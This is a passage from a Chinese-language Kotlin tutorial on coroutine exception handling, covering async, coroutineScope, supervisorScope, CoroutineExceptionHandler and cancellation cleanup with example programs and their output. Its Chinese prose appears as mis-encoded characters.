<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before async"</span>)
    <span class="hljs-keyword">val</span> deferredResult = async {
        <span class="hljs-keyword">try</span> {
            println(<span class="hljs-string">"Inside async: About to fail..."</span>)
            delay(<span class="hljs-number">500</span>)
            <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Async operation failed!"</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Caught exception inside async: <span class="hljs-subst">${e.message}</span>"</span>)
            <span class="hljs-keyword">return</span><span class="hljs-symbol">@async</span> <span class="hljs-string">"Fallback result"</span> <span class="hljs-comment">// å¼‚å¸¸å¤„ç†åè¿”å›é»˜è®¤ç»“æœ</span>
        }
        <span class="hljs-string">"This will never be returned"</span>
    }
    println(<span class="hljs-string">"After async"</span>)
    <span class="hljs-keyword">val</span> result = deferredResult.await()
    println(<span class="hljs-string">"Result: <span class="hljs-variable">$result</span>"</span>)
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-vbnet" lang="vbnet">
Before <span class="hljs-keyword">async</span>
After <span class="hljs-keyword">async</span>
Inside <span class="hljs-keyword">async</span>: About <span class="hljs-keyword">to</span> fail...
Caught exception inside <span class="hljs-keyword">async</span>: <span class="hljs-keyword">Async</span> operation failed!
<span class="hljs-symbol">Result:</span> Fallback result
Main finished
</code></pre>
<p>æ­¤æ—¶ç¨‹åºä¸ä¼šå´©æºƒï¼Œå› ä¸ºå¼‚å¸¸å·²åœ¨ <code>async</code> å†…éƒ¨å¤„ç†å®Œæ¯•ï¼Œ<code>await()</code> èƒ½æ­£å¸¸è·å–åˆ° <code>catch</code> å—è¿”å›çš„ç»“æœã€‚</p>
<h2 data-id="heading-9">åœºæ™¯ä¸‰ï¼šçˆ¶å­åç¨‹å…³ç³»</h2>
<p>è¿™æ˜¯ç»“æ„åŒ–å¹¶å‘çš„æ ¸å¿ƒä»·å€¼æ‰€åœ¨ã€‚<code>coroutineScope</code> ä¼šç­‰å¾…æ‰€æœ‰å­åç¨‹å®Œæˆï¼Œä¸€æ—¦ä»»æ„ä¸€ä¸ªå­åç¨‹å¤±è´¥ï¼Œæ•´ä¸ªä½œç”¨åŸŸä¼šç«‹å³å–æ¶ˆå…¶ä»–æ‰€æœ‰å­åç¨‹ï¼Œéšåè‡ªèº«ä¹Ÿå¤±è´¥ã€‚</p>
<h3 data-id="heading-10">ä¸€ä¸ªå­åç¨‹å¤±è´¥ï¼Œå…¨ä½œç”¨åŸŸå–æ¶ˆ</h3>
<p>è¿™ç§æœºåˆ¶èƒ½é˜²æ­¢ç¨‹åºè¿›å…¥ä¸ä¸€è‡´çŠ¶æ€ã€‚å¦‚æœæŸä¸ªå…³é”®æ“ä½œå¤±è´¥ï¼Œå–æ¶ˆæ•´ä¸ªå…³è”æ“ä½œè¿œæ¯”è®©å…¶ä»–éƒ¨åˆ†ç»§ç»­è¿è¡Œæ›´å®‰å…¨ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the scope..."</span>)
    <span class="hljs-keyword">try</span> {
        coroutineScope { <span class="hljs-comment">// åˆ›å»ºæ–°ä½œç”¨åŸŸ</span>
            launch {
                <span class="hljs-keyword">try</span> {
                    println(<span class="hljs-string">"Child 1: Working for 1000ms..."</span>)
                    delay(<span class="hljs-number">1000</span>)
                    println(<span class="hljs-string">"Child 1: Finished."</span>) <span class="hljs-comment">// ä¸ä¼šæ‰§è¡Œ</span>
                } <span class="hljs-keyword">finally</span> {
                    println(<span class="hljs-string">"Child 1: I was cancelled!"</span>)
                }
            }

            launch {
                println(<span class="hljs-string">"Child 2: Working for 500ms then failing..."</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Child 2 failed!"</span>)
            }
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// Child 2 çš„å¼‚å¸¸å‘ä¸Šä¼ æ’­åˆ°çˆ¶ä½œç”¨åŸŸå¹¶è¢«æ•è·</span>
        println(<span class="hljs-string">"Caught exception in parent scope: <span class="hljs-subst">${e.message}</span>"</span>)
    }
    println(<span class="hljs-string">"Scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting the scope...
Child 1: Working for 1000ms...
Child 2: Working for 500ms then failing...
Child 1: I was cancelled!
Caught exception in parent scope: Child 2 failed!
Scope finished.
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒChild 2 å¤±è´¥åï¼ŒChild 1 è¿˜æ²¡å®Œæˆå·¥ä½œå°±è¢«ç«‹å³å–æ¶ˆäº†ã€‚</p>
<h3 data-id="heading-11">åµŒå¥—ä½œç”¨åŸŸçš„å¼‚å¸¸ä¼ æ’­</h3>
<p>åœ¨åç¨‹ä½œç”¨åŸŸå†…åµŒå¥—å¦ä¸€ä¸ª <code>coroutineScope</code> æ—¶ï¼Œå†…å±‚ä½œç”¨åŸŸä¼šéµå¾ªåŒæ ·çš„â€œå¤±è´¥å³å–æ¶ˆâ€è§„åˆ™ã€‚</p>
<p>å¦‚æœçˆ¶ä½œç”¨åŸŸå¤±è´¥ï¼Œå†…å±‚ä½œç”¨åŸŸä¼šè¢«å–æ¶ˆï¼›åä¹‹ï¼Œå†…å±‚ä½œç”¨åŸŸçš„ä»»æ„å­åç¨‹å¤±è´¥ï¼Œä¹Ÿä¼šå¯¼è‡´å†…å±‚æ‰€æœ‰å­åç¨‹å–æ¶ˆï¼Œå¹¶å°†å¼‚å¸¸ä¼ æ’­åˆ°çˆ¶ä½œç”¨åŸŸã€‚è¿™ç§åµŒå¥—ç»“æ„ç¡®ä¿äº†æ•´ä¸ªä»»åŠ¡æ ‘çš„ä¸€è‡´æ€§å’Œå¯æ§æ€§ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the scope..."</span>)
    launch {
        println(<span class="hljs-string">"Parent: Working for 500ms then failing..."</span>)
        delay(<span class="hljs-number">500</span>)
        <span class="hljs-comment">// æŠ›å‡ºä¸€ä¸ªä¸Šå±‚å¼‚å¸¸</span>
        <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Parent failed!"</span>)
    }
    <span class="hljs-keyword">try</span> {
        coroutineScope { <span class="hljs-comment">// åˆ›å»ºæ–°ä½œç”¨åŸŸ</span>
            launch {
                <span class="hljs-keyword">try</span> {
                    println(<span class="hljs-string">"Child 1: Working for 1000ms..."</span>)
                    delay(<span class="hljs-number">1000</span>)
                    println(<span class="hljs-string">"Child 1: Finished."</span>) <span class="hljs-comment">// ä¸ä¼šæ‰§è¡Œ</span>
                } <span class="hljs-keyword">finally</span> {
                    println(<span class="hljs-string">"Child 1: I was cancelled!"</span>)
                }
            }
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// ä¸Šå±‚å¼‚å¸¸å¯¼è‡´åç¨‹å–æ¶ˆå¹¶è¢«æ•è·</span>
        println(<span class="hljs-string">"Caught exception in scope: <span class="hljs-subst">${e.message}</span>"</span>)
    }
}
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">Starting</span> <span class="hljs-string">the</span> <span class="hljs-string">scope...</span>
<span class="hljs-attr">Parent:</span> <span class="hljs-string">Working</span> <span class="hljs-string">for</span> <span class="hljs-string">500ms</span> <span class="hljs-string">then</span> <span class="hljs-string">failing...</span>
<span class="hljs-attr">Child 1:</span> <span class="hljs-string">Working</span> <span class="hljs-string">for</span> <span class="hljs-string">1000ms...</span>
<span class="hljs-attr">Child 1:</span> <span class="hljs-string">I</span> <span class="hljs-string">was</span> <span class="hljs-string">cancelled!</span>
<span class="hljs-attr">Caught exception in scope:</span> <span class="hljs-string">Parent</span> <span class="hljs-string">job</span> <span class="hljs-string">is</span> <span class="hljs-string">Cancelling</span>
<span class="hljs-string">...</span>
</code></pre>
<h2 data-id="heading-12">åœºæ™¯å››ï¼šéš”ç¦»</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5848ba38d0e44e79ebe58c3d2477b6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559965&amp;x-signature=8DBhvOgNfjptcIN9%2F8uT1XqcLgg%3D" alt="1.jpg" loading="lazy"/></p>
<p>å¦‚æœå¸Œæœ›æŸä¸ªå­åç¨‹çš„å¤±è´¥ä¸å½±å“å…¶ä»–å…„å¼Ÿåç¨‹ï¼Œå°±ç”¨ <code>supervisorScope</code>â€”â€”å®ƒä¼šè¦†ç›–çˆ¶ä½œç”¨åŸŸçš„å–æ¶ˆç­–ç•¥ã€‚</p>
<h3 data-id="heading-13">ä½¿ç”¨æ€è·¯</h3>
<p><code>supervisorScope</code> ä¸­ç›´æ¥å­åç¨‹çš„å¼‚å¸¸ï¼Œä¸ä¼šè§¦å‘çˆ¶ä½œç”¨åŸŸæˆ–å…„å¼Ÿåç¨‹çš„å–æ¶ˆã€‚è¿™ç§ç‰¹æ€§åœ¨ UI åº”ç”¨ä¸­ç‰¹åˆ«å®ç”¨ï¼Œæ¯”å¦‚å¤šä¸ªç‹¬ç«‹ä»»åŠ¡å¹¶è¡Œè¿è¡Œæ—¶ï¼Œä¸€ä¸ªä»»åŠ¡å‡ºé”™ä¸è¯¥å¯¼è‡´æ•´ä¸ªç•Œé¢å¡æ­»ã€‚</p>
<p>é‡è¦æç¤ºï¼šç›‘ç£æœºåˆ¶ä»…å¯¹<strong>ç›´æ¥å­åç¨‹</strong>ç”Ÿæ•ˆã€‚</p>
<p>è¿™ä¸€ç‚¹æˆ‘å‘ç°å¾ˆå¤šå¼€å‘è€…åŒ…æ‹¬æˆ‘çš„åŒäº‹ä¹Ÿå¿½ç•¥äº†ï¼ä½ å¯ä»¥è¿™æ ·è®°ä½ï¼š</p>
<p>çˆ¸çˆ¸åªç®¡å„¿å­ï¼Œç®¡ä¸ç€å­™å­ï¼</p>
<p>å­™å­è°ç®¡ï¼Ÿå„¿å­ç®¡ï¼</p>
<p>å½“ç„¶ï¼Œå¦‚æœåœ¨ <code>supervisorScope</code> å†…éƒ¨åµŒå¥— <code>coroutineScope</code>ï¼Œè¿™ä¸ªå†…å±‚ä½œç”¨åŸŸä»éµå¾ªâ€œå¤±è´¥å³å–æ¶ˆâ€è§„åˆ™â€”â€”å…¶å†…éƒ¨ä»»æ„å­åç¨‹å¤±è´¥ï¼Œéƒ½ä¼šå¯¼è‡´å†…å±‚æ‰€æœ‰å­åç¨‹è¢«å–æ¶ˆã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the supervisor scope..."</span>)
    <span class="hljs-keyword">try</span> {
        supervisorScope { <span class="hljs-comment">// å­åç¨‹å¤±è´¥éš”ç¦»</span>
            launch {
                println(<span class="hljs-string">"Child 1: Working for 500ms then failing..."</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Child 1 failed!"</span>)
            }

            launch {
                <span class="hljs-keyword">try</span> {
                    println(<span class="hljs-string">"Child 2: Working for 1000ms..."</span>)
                    delay(<span class="hljs-number">1000</span>)
                    println(<span class="hljs-string">"Child 2: Finished successfully!"</span>) <span class="hljs-comment">// ä¼šæ‰§è¡Œ</span>
                } <span class="hljs-keyword">finally</span> {
                    println(<span class="hljs-string">"Child 2: I was NOT cancelled!"</span>)
                }
            }
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// âŒ ä¸ä¼šæ‰§è¡Œï¼ŒsupervisorScope ä¸ä¼ æ’­å­åç¨‹å¼‚å¸¸</span>
        println(<span class="hljs-string">"Caught exception in parent scope: <span class="hljs-variable">$e</span>"</span>)
    }
    println(<span class="hljs-string">"Supervisor scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting the supervisor scope...
Child 1: Working for 500ms then failing...
Child 2: Working for 1000ms...
Exception in thread "main" java.lang.RuntimeException: Child 1 failed!
... (å †æ ˆä¿¡æ¯) ...
Child 2: Finished successfully!
Child 2: I was NOT cancelled!
Supervisor scope finished.
</code></pre>
<p>è¿™é‡Œç¨‹åºä¾ç„¶å´©æºƒäº†â€”â€”åŸå› æ˜¯ <code>supervisorScope</code> åªé˜»æ­¢å–æ¶ˆä¼ æ’­ï¼ˆä¹Ÿå°±æ˜¯ä¸ä¼šå–æ¶ˆå…¶ä»–å„¿å­çš„ä»»åŠ¡ï¼‰ï¼Œä¸ä¼šè‡ªåŠ¨å¤„ç†å¼‚å¸¸ã€‚</p>
<p>Child 1 æŠ›å‡ºçš„å¼‚å¸¸æœªè¢«æ•è·ï¼Œæœ€ç»ˆå¯¼è‡´ä¸»çº¿ç¨‹å´©æºƒã€‚å› æ­¤ï¼Œå¿…é¡»åœ¨ <code>supervisorScope</code> çš„å­åç¨‹å†…éƒ¨æ‰‹åŠ¨å¤„ç†å¼‚å¸¸ã€‚</p>
<h3 data-id="heading-14">æ­£ç¡®ä½¿ç”¨ supervisorScope</h3>
<p>åœ¨ <code>supervisorScope</code> çš„å­åç¨‹å†…éƒ¨æ·»åŠ  <code>try-catch</code>ï¼Œæ‰‹åŠ¨å¤„ç†å¼‚å¸¸ã€‚</p>
<p><em>å†æ¬¡ç”¨åˆ°å¤æ³•æ•è·ï¼ä½ ä¸è¦ç®¡è€ä¸è€ï¼Œå…³é”®æ˜¯å¥½ä½¿ï¼</em></p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting the supervisor scope..."</span>)
    supervisorScope {
        <span class="hljs-comment">// Child 1 è‡ªè¡Œå¤„ç†å¼‚å¸¸</span>
        launch {
            <span class="hljs-keyword">try</span> {
                println(<span class="hljs-string">"Child 1: I'm going to fail."</span>)
                delay(<span class="hljs-number">500</span>)
                <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Child 1 failed!"</span>)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                println(<span class="hljs-string">"Caught in Child 1: <span class="hljs-subst">${e.message}</span>"</span>)
            }
        }

        <span class="hljs-comment">// Child 2 ç‹¬ç«‹è¿è¡Œï¼Œä¸å—å½±å“</span>
        launch {
            println(<span class="hljs-string">"Child 2: I will succeed."</span>)
            delay(<span class="hljs-number">1000</span>)
            println(<span class="hljs-string">"Child 2: Finished successfully!"</span>)
        }
    }
    println(<span class="hljs-string">"Supervisor scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting the supervisor scope...
Child 1: I'm going to fail.
Child 2: I will succeed.
Caught in Child 1: Child 1 failed!
Child 2: Finished successfully!
Supervisor scope finished.
</code></pre>
<p>æ­¤æ—¶è¿è¡Œæ­£å¸¸ï¼šChild 1 å¤±è´¥åè‡ªè¡Œå¤„ç†äº†é”™è¯¯ï¼ŒChild 2 ä¸å—å½±å“å¹¶é¡ºåˆ©å®Œæˆä»»åŠ¡ï¼ŒåŒæ—¶ä¹Ÿä¸ä¼šå½±å“ç¨‹åºè¿è¡Œï¼Œä¸€åˆ‡ç…§å¸¸ï¼</p>
<h2 data-id="heading-15">åœºæ™¯äº”ï¼šå…¨å±€å¼‚å¸¸æ•è·</h2>
<p><code>CoroutineExceptionHandler</code> æ˜¯åç¨‹å¼‚å¸¸å¤„ç†çš„â€œæœ€åé˜²çº¿â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ä¸Šä¸‹æ–‡å…ƒç´ ï¼Œå¯æ·»åŠ åˆ°é¡¶å±‚ä½œç”¨åŸŸï¼Œç”¨äºæ•è·æ‰€æœ‰æœªè¢«å…¶ä»–æ–¹å¼å¤„ç†çš„å¼‚å¸¸ã€‚</p>
<h3 data-id="heading-16">é€‚ç”¨åœºæ™¯</h3>
<p>ä¸»è¦ç”¨äºæ—¥å¿—è®°å½•ã€é”™è¯¯ä¸ŠæŠ¥æˆ–æ¸…ç†æœªå¤„ç†å¼‚å¸¸ï¼Œç‰¹åˆ«é€‚åˆä¸ <code>GlobalScope</code> æˆ– <code>SupervisorJob</code> é…åˆä½¿ç”¨ã€‚</p>
<h3 data-id="heading-17">æ— æ•ˆåœºæ™¯</h3>
<p>å¯¹æ™®é€š <code>coroutineScope</code> çš„å­åç¨‹æ— æ•ˆâ€”â€”å› ä¸º <code>coroutineScope</code> ä¼šåœ¨å­åç¨‹å¤±è´¥æ—¶ä¸»åŠ¨å–æ¶ˆå¹¶å¤„ç†å¼‚å¸¸ï¼Œä¸ä¼šè®©å¼‚å¸¸å†’æ³¡åˆ°é¡¶å±‚å¤„ç†å™¨ã€‚</p>
<p>ä½†å¯¹ <code>async</code> æœ‰æ•ˆï¼Œå› ä¸ºå…¶å¼‚å¸¸è¢«å°è£…åœ¨ <code>Deferred</code> ä¸­ï¼Œç›´åˆ° <code>await()</code> æ‰æš´éœ²ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// 1. åˆ›å»ºå¼‚å¸¸å¤„ç†å™¨</span>
    <span class="hljs-keyword">val</span> handler = CoroutineExceptionHandler { _, exception -&gt;
        println(<span class="hljs-string">"Caught by CoroutineExceptionHandler: <span class="hljs-variable">$exception</span>"</span>)
    }

    <span class="hljs-comment">// 2. åˆ›å»ºå¸¦å¤„ç†å™¨çš„ SupervisorJob ä½œç”¨åŸŸ</span>
    <span class="hljs-keyword">val</span> scope = CoroutineScope(SupervisorJob() + handler)

    <span class="hljs-comment">// 3. å¯åŠ¨ä¼šå¤±è´¥çš„åç¨‹</span>
    scope.launch {
        println(<span class="hljs-string">"Child 1: Failing..."</span>)
        <span class="hljs-keyword">throw</span> AssertionError(<span class="hljs-string">"Something is wrong!"</span>)
    }

    <span class="hljs-comment">// 4. å¯åŠ¨ä¸å—å½±å“çš„åç¨‹</span>
    scope.launch {
        delay(<span class="hljs-number">500</span>)
        println(<span class="hljs-string">"Child 2: I'm alive!"</span>)
    }

    <span class="hljs-comment">// ç­‰å¾…åç¨‹æ‰§è¡Œ</span>
    delay(<span class="hljs-number">1000</span>)
    println(<span class="hljs-string">"Main finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Child 1: Failing...
Caught by CoroutineExceptionHandler: java.lang.AssertionError: Something is wrong!
Child 2: I'm alive!
Main finished.
</code></pre>
<p>å¤„ç†å™¨æˆåŠŸæ•è·äº† Child 1 çš„å¼‚å¸¸ï¼ŒåŒæ—¶ Child 2 ä¸å—å½±å“æ­£å¸¸è¿è¡Œï¼Œä¸”ç¨‹åºä¹Ÿæ­£å¸¸è¿è¡Œï¼Œæ²¡æœ‰å´©æºƒâ€”â€”è¿™æ­£æ˜¯ <code>SupervisorJob</code> éš”ç¦»å¤±è´¥çš„ç‰¹æ€§ä¸ <code>CoroutineExceptionHandler</code> å…¨å±€æ•è·çš„ç»“åˆæ•ˆæœã€‚</p>
<h2 data-id="heading-18">åœºæ™¯å…­ï¼šsupervisorScope ä¸­ä½¿ç”¨ async</h2>
<p><code>supervisorScope</code> éš”ç¦»å¤±è´¥çš„è§„åˆ™å¯¹ <code>async</code> åŒæ ·é€‚ç”¨ï¼šæŸä¸ª <code>async</code> å­åç¨‹å¤±è´¥ï¼Œä¸ä¼šå½±å“å…¶ä»–å…„å¼Ÿåç¨‹ï¼ˆæ— è®º <code>launch</code> è¿˜æ˜¯ <code>async</code>ï¼‰ã€‚</p>
<p>ä½† <code>async</code> çš„å¼‚å¸¸ä»ä¼šæš‚å­˜äº <code>Deferred</code> å¯¹è±¡ä¸­ï¼Œéœ€åœ¨è°ƒç”¨ <code>await()</code> æ—¶æ‰‹åŠ¨å¤„ç†ã€‚</p>
<h3 data-id="heading-19">ä½¿ç”¨æ€è·¯</h3>
<p>è¿™ç§ç»„åˆé€‚åˆå¤šä¸ªç‹¬ç«‹çš„å¼‚æ­¥ä»»åŠ¡å¹¶è¡Œæ‰§è¡Œçš„åœºæ™¯ã€‚å³ä½¿æŸä¸ªä»»åŠ¡å¤±è´¥ï¼Œå…¶ä»–ä»»åŠ¡ä»èƒ½æ­£å¸¸å®Œæˆï¼Œä¸”å¤±è´¥ä»»åŠ¡çš„å¼‚å¸¸å¯åœ¨è·å–ç»“æœæ—¶å•ç‹¬å¤„ç†ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Starting supervisor scope with async..."</span>)
    supervisorScope {
        <span class="hljs-comment">// ä¼šå¤±è´¥çš„ async ä»»åŠ¡</span>
        <span class="hljs-keyword">val</span> deferredFailure = async {
            println(<span class="hljs-string">"Async 1: I will fail in 500ms."</span>)
            delay(<span class="hljs-number">500</span>)
            <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Failure!"</span>)
        }

        <span class="hljs-comment">// ä¼šæˆåŠŸçš„ async ä»»åŠ¡</span>
        <span class="hljs-keyword">val</span> deferredSuccess = async {
            println(<span class="hljs-string">"Async 2: I will succeed in 1000ms."</span>)
            delay(<span class="hljs-number">1000</span>)
            <span class="hljs-string">"Success!"</span>
        }

        <span class="hljs-comment">// å¤„ç†å¤±è´¥ä»»åŠ¡çš„å¼‚å¸¸</span>
        <span class="hljs-keyword">try</span> {
            deferredFailure.await()
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Caught expected failure from Async 1: <span class="hljs-subst">${e.message}</span>"</span>)
        }

        <span class="hljs-comment">// è·å–æˆåŠŸä»»åŠ¡çš„ç»“æœ</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">val</span> result = deferredSuccess.await()
            println(<span class="hljs-string">"Result from Async 2: <span class="hljs-variable">$result</span>"</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Caught unexpected failure from Async 2: <span class="hljs-variable">$e</span>"</span>)
        }
    }
    println(<span class="hljs-string">"Supervisor scope finished."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Starting supervisor scope with async...
Async 1: I will fail in 500ms.
Async 2: I will succeed in 1000ms.
Caught expected failure from Async 1: Failure!
Result from Async 2: Success!
Supervisor scope finished.
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>deferredSuccess</code> æœªå— <code>deferredFailure</code> å¼‚å¸¸å½±å“ï¼Œæ­£å¸¸å®Œæˆå¹¶è¿”å›ç»“æœï¼›åŒæ—¶ï¼Œ<code>deferredFailure</code> çš„å¼‚å¸¸åœ¨ <code>await()</code> æ—¶è¢«æˆåŠŸæ•è·ã€‚</p>
<h2 data-id="heading-20">åœºæ™¯ä¸ƒï¼šå–æ¶ˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„å¼‚å¸¸</h2>
<p>åç¨‹è¢«å–æ¶ˆæ—¶ï¼Œä¼šæŠ›å‡º <code>CancellationException</code>â€”â€”è¿™æ˜¯ä¸€ç§ç‰¹æ®Šå¼‚å¸¸ï¼Œé€šå¸¸ä¼šè¢«åç¨‹æœºåˆ¶è‡ªåŠ¨å¿½ç•¥ï¼Œæ— éœ€æ‰‹åŠ¨æ•è·ã€‚</p>
<h3 data-id="heading-21">ä½¿ç”¨æ€è·¯</h3>
<p><code>CancellationException</code> ä»£è¡¨åç¨‹æ­£å¸¸å–æ¶ˆï¼Œæ˜¯ç»“æ„åŒ–å¹¶å‘çš„å¸¸è§„è¡Œä¸ºã€‚è™½ç„¶å¯ä»¥ç”¨ <code>try-catch</code> æ•è·å®ƒï¼ˆæ¯”å¦‚ç”¨äºæ—¥å¿—è®°å½•ï¼‰ï¼Œä½†<strong>ä¸åº”â€œåæ‰â€å®ƒ</strong>â€”â€”è‹¥æ•è·åéœ€è¦æ‰§è¡Œé€»è¾‘ï¼ŒåŠ¡å¿…é‡æ–°æŠ›å‡ºï¼Œç¡®ä¿å–æ¶ˆæµç¨‹å®Œæ•´ã€‚åç¨‹çš„æ¸…ç†é€»è¾‘ï¼ˆå¦‚å…³é—­èµ„æºã€é‡Šæ”¾è¿æ¥ï¼‰ï¼Œæœ€ä½³ä½ç½®æ˜¯ <code>finally</code> å—ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> job = launch {
        <span class="hljs-keyword">try</span> {
            println(<span class="hljs-string">"Job: I'm working..."</span>)
            delay(<span class="hljs-number">2000</span>) <span class="hljs-comment">// æŒ‚èµ·ç‚¹ï¼Œå¯å“åº”å–æ¶ˆ</span>
            println(<span class="hljs-string">"Job: I'm done."</span>) <span class="hljs-comment">// ä¸ä¼šæ‰§è¡Œ</span>
        } <span class="hljs-keyword">catch</span> (e: CancellationException) {
            <span class="hljs-comment">// æ—¥å¿—è®°å½•ï¼Œå¿…é¡»é‡æ–°æŠ›å‡º</span>
            println(<span class="hljs-string">"Job: I was cancelled. Re-throwing exception."</span>)
            <span class="hljs-keyword">throw</span> e
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            println(<span class="hljs-string">"Job: Caught some other exception: <span class="hljs-variable">$e</span>"</span>)
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// âœ… æ¸…ç†é€»è¾‘çš„æ­£ç¡®ä½ç½®</span>
            println(<span class="hljs-string">"Job: Finally block executed for cleanup."</span>)
        }
    }

    delay(<span class="hljs-number">1000</span>)
    println(<span class="hljs-string">"Main: I'm tired of waiting, cancelling the job."</span>)
    job.cancelAndJoin() <span class="hljs-comment">// å–æ¶ˆå¹¶ç­‰å¾…åç¨‹å®Œæˆ</span>
    println(<span class="hljs-string">"Main: Job has been cancelled."</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Job: I'm working...
Main: I'm tired of waiting, cancelling the job.
Job: I was cancelled. Re-throwing exception.
Job: Finally block executed for cleanup.
Main: Job has been cancelled.
</code></pre>
<h2 data-id="heading-22">åœºæ™¯å…«ï¼šä¸å¯å–æ¶ˆçš„æ¸…ç†</h2>
<p>å¦‚æœ <code>finally</code> å—ä¸­çš„æ¸…ç†é€»è¾‘åŒ…å«æŒ‚èµ·å‡½æ•°ï¼ˆæ¯”å¦‚å†™æ–‡ä»¶ã€ç½‘ç»œè¯·æ±‚ï¼‰ï¼Œåç¨‹è¢«å–æ¶ˆåï¼Œè¿™äº›æŒ‚èµ·è°ƒç”¨ä¼šç«‹å³æŠ›å‡º <code>CancellationException</code>ï¼Œå¯¼è‡´æ¸…ç†é€»è¾‘æ— æ³•å®Œæ•´æ‰§è¡Œã€‚</p>
<h3 data-id="heading-23">è§£å†³æ–¹æ¡ˆ</h3>
<p>åœ¨ <code>finally</code> å—ä¸­ï¼Œé€šè¿‡ <code>withContext(NonCancellable)</code> åˆ‡æ¢ä¸Šä¸‹æ–‡ã€‚</p>
<p><code>NonCancellable</code> èƒ½ä¿è¯å—å†…ä»£ç å®Œæ•´æ‰§è¡Œï¼Œä¸å—åç¨‹å–æ¶ˆçŠ¶æ€å½±å“ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> job = launch {
        <span class="hljs-keyword">try</span> {
            println(<span class="hljs-string">"Job: Working..."</span>)
            delay(<span class="hljs-number">2000</span>)
        } <span class="hljs-keyword">finally</span> {
            println(<span class="hljs-string">"Job: Entering finally block."</span>)
            <span class="hljs-comment">// åˆ‡æ¢åˆ° NonCancellable ä¸Šä¸‹æ–‡æ‰§è¡ŒæŒ‚èµ·æ¸…ç†é€»è¾‘</span>
            withContext(NonCancellable) {
                println(<span class="hljs-string">"Job: Starting a suspending cleanup that takes 500ms..."</span>)
                delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ¸…ç†</span>
                println(<span class="hljs-string">"Job: Crucial cleanup finished."</span>)
            }
        }
    }

    delay(<span class="hljs-number">1000</span>)
    println(<span class="hljs-string">"Main: Cancelling the job."</span>)
    job.cancelAndJoin()
